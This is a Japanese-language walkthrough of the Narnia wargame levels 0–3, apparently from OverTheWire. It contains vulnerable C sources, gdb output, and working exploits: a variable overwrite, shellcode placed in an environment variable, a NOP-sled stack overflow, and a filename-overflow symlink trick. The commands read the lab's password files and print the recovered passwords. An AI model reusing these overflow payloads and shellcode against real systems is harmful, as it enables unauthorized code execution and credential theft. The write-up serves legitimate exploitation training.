# Narnia

## level 0
narnia0.c
```
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef)
		system("/bin/sh");
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```
bufには20文字しか入らない。試しに以下のようにすると
```
$ python -c 'print "A"*20 + "BBBBB"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
```
21字からの文字がvalの値に上書きされた.

なのでそこを`0xdeadbeef`にできれば良い
```
$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
```
`/bin/sh`が呼ばれるのでコマンドを送る.
```
$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
efeidiedae
```

## Level 1
```
#include <stdio.h>

int main(){
	int (*ret)();

	if(getenv("EGG")==NULL){
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}
```
環境変数EGGの値をretに入れて呼び出している。
EGGにシェルコードを入れる.

シェルコードの入手 - http://shell-storm.org/shellcode/
```
\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```
```
// 環境変数に入れる
$ export EGG=`python -c 'print "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`

narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!

$ cat /etc/narnia_pass/narnia2
nairiepecu
```

## Level 2
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
	char buf[128];

	if(argc == 1){
		printf("Usage: %s argument\n", argv[0]);
		exit(1);
	}
	strcpy(buf,argv[1]);
	printf("%s", buf);

	return 0;
}
```
コマンドライン引数をbufにコピーしている。bufは128バイトなので、それ以降は溢れてしまう。

```
gdb-peda$ pattc 150
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
Starting program: /home/ubuntu/Narnia/narnia2 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x0
ECX: 0x7fffff69
EDX: 0xf7fcb870 --> 0x0
ESI: 0xf7fca000 --> 0x1afdb0
EDI: 0xf7fca000 --> 0x1afdb0
EBP: 0x41514141 ('AAQA')
ESP: 0xffffd5d0 ("RAAoAA")
EIP: 0x41416d41 ('AmAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41416d41
[------------------------------------stack-------------------------------------]
0000| 0xffffd5d0 ("RAAoAA")
0004| 0xffffd5d4 --> 0xff004141
0008| 0xffffd5d8 --> 0xffffd670 --> 0xffffd841 ("DISPLAY=localhost:10.0")
0012| 0xffffd5dc --> 0x0
0016| 0xffffd5e0 --> 0x0
0020| 0xffffd5e4 --> 0x0
0024| 0xffffd5e8 --> 0xf7fca000 --> 0x1afdb0
0028| 0xffffd5ec --> 0xf7ffdc04 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41416d41 in ?? ()
gdb-peda$ patto AmAA
AmAA found at offset: 140
```
gdbで調べると上のように、140字からEIPを上書きすることがわかる。

bufにシェルコード( http://shell-storm.org/shellcode/files/shellcode-575.php )を入れて、そのあとEIPをシェルコードのあるアドレスに書き換えれば良い。

```
(gdb) r $(python -c'print "\x90"*119+ "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "BBBB"')
Starting program: /narnia/narnia2 $(python -c'print "\x90"*119+ "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "BBBB"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/250x $esp
0xffffd870:	0x6e72616e	0x00326169	0x90909090	0x90909090
0xffffd880:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd890:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8e0:	0x90909090	0x90909090	0x90909090	0x6a909090
0xffffd8f0:	0x5299580b	0x732f2f68	0x622f6868	0xe3896e69
0xffffd900:	0x80cdc931	0x42424242	0x45485300	0x2f3d4c4c
0xffffd910:	0x2f6e6962	0x68736162	0x52455400	0x74783d4d
```
NOPのあとにシェルコードを仕込んだ。NOPのどこかにEIPを設定すれば自動的にシェルコードまで勝手にずれてくれる.

0xffffd8a0あたりにEIPを設定するとシェルを起動できた。
```
narnia2@narnia:~$ /narnia/narnia2 $(python -c'print "\x90"*119+ "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\xa0\xd8\xff\xff"')
$ cat /etc/narnia_pass/narnia3
vaequeezee
```

## Level 3
```
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32];
        char buf[32];

        if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
        }

        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
        }

        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

        /* close 'em */
        close(ifd);
        close(ofd);

        exit(1);
}
```
コマンドライン引数に与えたファイルの中身を/dev/nullに書き込む.

/etc/narnia_pass/narnia4を/dev/nullじゃないところに書き込めれば良さそう.

ifile[32]から溢れた文字列がofileを書き換えてしまう。

`tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB/tmp/out`とするとofileは/tmp/outに上書きされる。この時ifileは`tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB/tmp/out`なので、

`tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB/tmp/out`の中身が/tmp/outに書かれることになる。

narnia4のパスワードが見たいので、`/etc/narnia_pass/narnia4`へのリンクをはる.
```
$ mkdir `python -c 'print "/tmp/" + "B"*27'`
$ cd tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB
$ mkdir tmp
$ cd tmp
$ touch out 
$ chmod 777 out
$ ln -s /etc/narnia_pass/narnia4 ./out
$ /narnia/narnia3 `python -c'print "/tmp/" + "B"*27 + "/tmp/out"'`
copied contents of /tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB/tmp/narnia4-kbd to a safer place... (/tmp/out)
$ cat /tmp/out
thaenohtai
```
